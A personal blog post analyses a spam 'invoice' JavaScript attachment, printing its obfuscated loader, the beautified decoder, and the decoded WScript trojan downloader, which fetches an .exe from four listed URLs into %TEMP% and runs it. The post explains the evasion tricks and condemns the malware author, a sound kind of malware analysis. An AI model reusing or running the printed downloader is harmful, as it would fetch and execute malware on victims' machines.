---
layout: post
title: Sick use of technology
categories: [tech]
tags: []
published: True

---

So my abandoned email address was recently spammed with a lot of "invoices" that I did not pay. Each "invoice" is a JavaScript file that looks like this:

{% highlight js %}
var UdpJBNrcsNApR=[];for(wNNrUTG=(-840+840)/419;wNNrUTG<(14733+499)/119;wNNrUTG++){UdpJBNrcsNApR[wNNrUTG]=String.fromCharCode(wNNrUTG)}function TRbfH(RnyFtbnscoR,dWlUzxYAmCDrq,jVSHyhVl){kfgB=parseInt(RnyFtbnscoR,dWlUzxYAmCDrq);uPvuf=kfgB.toString(jVSHyhVl);return uPvuf;}function IMnKyzGDgNtoqZM(eOQyFMPlBvYVXxifI){eval(eOQyFMPlBvYVXxifI)}
function oZoKVfOEBCbxruazhlJtnbYbWKFGMLHLFDNOOzbjFzuRQgZSDRgeOD(SPERYSHJTIwby,glflOEANqFOpXF){ return UdpJBNrcsNApR[TRbfH(SPERYSHJTIwby[glflOEANqFOpXF],(7234+266)/750,(6206+74)/628)];}
function CvSBklu(dUsMXWkKxnPhKSBcKMDAWNJQlOJlNNSXeTrj) {return !isNaN(parseFloat(dUsMXWkKxnPhKSBcKMDAWNJQlOJlNNSXeTrj)) && isFinite(dUsMXWkKxnPhKSBcKMDAWNJQlOJlNNSXeTrj);}
function asPGOqPoyQe(UfzlDOUG,WYuyuu){return UfzlDOUG.split(WYuyuu)}
var T=[];T.push("13");T.push("10");T.push("13");T.push("10");T.push("118");T.push("97");T.push("114");T.push("32");T.push("76");T.push("32");T.push("61");T.push("32");T.push("34");T.push("112");T.push("114");T.push("101");T.push("115");T.push("116");T.push("97");T.push("107");T.push("105");T.push("116");T.push("99");T.push("104");T.push("101");T.push("110");T.push("46");T.push("99");T.push("111");T.push("109");T.push("47");T.push("119");T.push("112");T.push("45");T.push("105");T.push("110");T.push("99");T.push("108");T.push("117");T.push("100");T.push("101");T.push("115");T.push("47");T.push("112");T.push("111");T.push("109");T.push("111");T.push("47");T.push("56");T.push("53");T.push("46");T.push("101");T.push("120");T.push("101");T.push("63");T.push("32");T.push("97");T.push("99");T.push("115");T.push("98");T.push("114");T.push("111");T.push("107");T.push("101");T.push("114");T.push("97");T.push("103");T.push("101");T.push("46");T.push("99");T.push("111");T.push("109");T.push("47");T.push("99");T.push("115");T.push("115");T.push("47");T.push("102");T.push("111");T.push("110");T.push("116");T.push("115");T.push("47");T.push("95");T.push("95");T.push("112");T.push("97");T.push("103");T.push("101");T.push("115");T.push("95");T.push("115");T.push("111");T.push("117");T.push("114");T.push("99");T.push("101");T.push("115");T.push("47");T.push("56");T.push("53");T.push("46");T.push("101");T.push("120");T.push("101");T.push("63");T.push("32");T.push("97");T.push("98");T.push("111");T.push("117");

... and the array push continues ...

var yuWIy=[T,s];
var NLfSHoSCV=[];
function AwRUQXgZdYewyfjsL(yuWIy){BJgJYCcnDpy= '';for(WbcrWHNJlUX=(-133+133)/1; WbcrWHNJlUX < (1174+444)/809; WbcrWHNJlUX++) {NLfSHoSCV[WbcrWHNJlUX]=(-484+484)/81; while(true) { if(NLfSHoSCV[WbcrWHNJlUX] > yuWIy[WbcrWHNJlUX].length-(-159+260)/101) { break; } if (CvSBklu(TRbfH(yuWIy[WbcrWHNJlUX][NLfSHoSCV[WbcrWHNJlUX]],(2917+733)/365,(4380+170)/455))) {BJgJYCcnDpy += oZoKVfOEBCbxruazhlJtnbYbWKFGMLHLFDNOOzbjFzuRQgZSDRgeOD([yuWIy[WbcrWHNJlUX][NLfSHoSCV[WbcrWHNJlUX]]], (-214+214)/308);} NLfSHoSCV[WbcrWHNJlUX]++;}} return BJgJYCcnDpy}
IMnKyzGDgNtoqZM(AwRUQXgZdYewyfjsL(yuWIy));
{% endhighlight %}

Since I love the JavaScript language and I used to be a huge, huge fan of viruses and antivirus software in middle school, I immediately realized that my CS background in university has finally prepared me to deeply dive into these codes and find out why they are malicious.

## Beautify the uglified

So the massive `array.push` seems like it's building a string from ASCII characters. However, I really need to first use a [beautifier](http://jsbeautifier.org/) to properly indent the code.

The part after all the array pushes looks like this:

{% highlight js %}
function AwRUQXgZdYewyfjsL(yuWIy) {
    BJgJYCcnDpy = '';
    for (WbcrWHNJlUX = (-133 + 133) / 1; WbcrWHNJlUX < (1174 + 444) / 809; WbcrWHNJlUX++) {
        NLfSHoSCV[WbcrWHNJlUX] = (-484 + 484) / 81;
        while (true) {
            if (NLfSHoSCV[WbcrWHNJlUX] > yuWIy[WbcrWHNJlUX].length - (-159 + 260) / 101) {
                break;
            }
            if (CvSBklu(TRbfH(yuWIy[WbcrWHNJlUX][NLfSHoSCV[WbcrWHNJlUX]], (2917 + 733) / 365, (4380 + 170) / 455))) {
                BJgJYCcnDpy += oZoKVfOEBCbxruazhlJtnbYbWKFGMLHLFDNOOzbjFzuRQgZSDRgeOD([yuWIy[WbcrWHNJlUX][NLfSHoSCV[WbcrWHNJlUX]]], (-214 + 214) / 308);
            }
            NLfSHoSCV[WbcrWHNJlUX]++;
        }
    }
    return BJgJYCcnDpy
}

IMnKyzGDgNtoqZM(AwRUQXgZdYewyfjsL(yuWIy));
{% endhighlight %}

Here I am particularly interested in the last line. The `IMnKyzGDgNtoqZM` function takes a parameter, and then calls `eval(param)`. That's all it does. So I guess it's building a string that's another JavaScript code, and everything above is likely safe until I actually evaluate it.

## Let's run it

### ... only if you know what you're doing.###

So I did, because I know I'm safe if I don't run the last line, and running everything above will reveal the secrets in the array. The parameter passed into the obfuscated `eval` function looks like this:

{% highlight js linenos %}
var L = "prestakitchen.com/wp-includes/pomo/85.exe? acsbrokerage.com/css/fonts/__pages_sources/85.exe? aboutacquisitions.com/wp-includes/theme-compat/85.exe? 46.151.52.197/85.exe?".split(" ");
var GHs =((1/*rGiz542702596n847085uM354193eOiZ*/)?"WScri":"")+"pt.Shell";
var uI = WScript.CreateObject(GHs);
var Ht = "%TEMP%\\";
var Cms = uI.ExpandEnvironmentStrings(Ht);
var nsz = "2.XMLH";
var Rhg = nsz + "TTP";
var qt = true  , Napl = "ADOD";
var Qi = WScript.CreateObject("MS"+"XML"+(315275, Rhg));
var Jeu = WScript.CreateObject(Napl + "B.St"+(356233, "ream"));
var nUm = 0;
var Y = 1;
var cfvnksE = 937547;
for (var d=nUm; d<L.length; d++)  {
  var rG = 0;
  try  {
    poi = "GET";     
    Qi.open(poi,"http://"+L[d]+Y, false); Qi.send(); if (Qi.status == 359-159)  {
      Jeu.open(); Jeu.type = 1; Jeu.write(Qi.responseBody); if (Jeu.size > 2356-787)  {
        rG = 1; Jeu.position = 0; Jeu.saveToFile/*AV6k708QWx*/(Cms/*3JJG480PaV*/+cfvnksE+".exe",4-2); try  {
          if (((new Date())>0,7918092888)) {
            uI./*d747795OAiR*/Run(Cms+cfvnksE+/*b04z77lSpO*/".exe",/*uda163ArdM*/3-2,0); 
            break;
          }
        }
        catch (Ua)  {
        }; 
      }; Jeu.close(); 
    }; 
    if (rG == 1)  {
      nUm = d; break; 
    }; 
  }
  catch (Ua)  { 
  }; 
}; 
{% endhighlight %}

## So what is this?

As you can see, the first line is creating an array in a fairly interesting way. The content? Oh wow, it's an array of 4 links to an exe file! Without reading further I'd know this is one of the `Trojan Downloaders` that I encountered before, which really remind me of my middle school fun life with these things in the sandbox (oh yeah). 

And the fact that it's using `WScript` can't be more familiar - almost all antivirus software alerting me of a trojan downloader will say something about [WScript](https://support.microsoft.com/en-us/kb/232211). I guess it's like a Bash script for linux, except this is in Windows - because JavaScript alone won't download the file and execute it on your behalf. 

It is also very fun to read line 2, 21 and 22. Line 2 and 22 are the essential parts of the downloading and executing process, they are constructing the WScript, and running the exe file. It's interesting because there are random comments inserted between the important parts, like the `Run` method call and the exe file name. Line 2 even uses a `?:` operator where the condition always evaluates to true. Line 21 is creating a new `Date` object and compares it to 0 (which is always true), and then added a comma and a number, which does nothing. All of these little tricks is trying to bypass the antivirus scan, and even I can see it's really amateur. I highly doubt this method will trick the so-called **signature-based detection** - which is the reason you update your antivirus software. Not to mention even in my middle school time, the behaviour-based **proactive defense** technique was already standard. Not to mention further that the actuall exe might be killed right away, and technically this JavaScript file is not a virus itself. 

## Please write good software

As the Chinese saying says, "A evil person is more dangerous when he is knowledgable". As an ambitious software engineer, I hope people stop writing this kind of software. Put your knowledge in good use. To the author of this code, although you look like a newbie (lol), you must have some talent to write all these, therefore I wouldn't believe you could only get some income in this way. We create softwares to make our lives easier, not the other way around. 
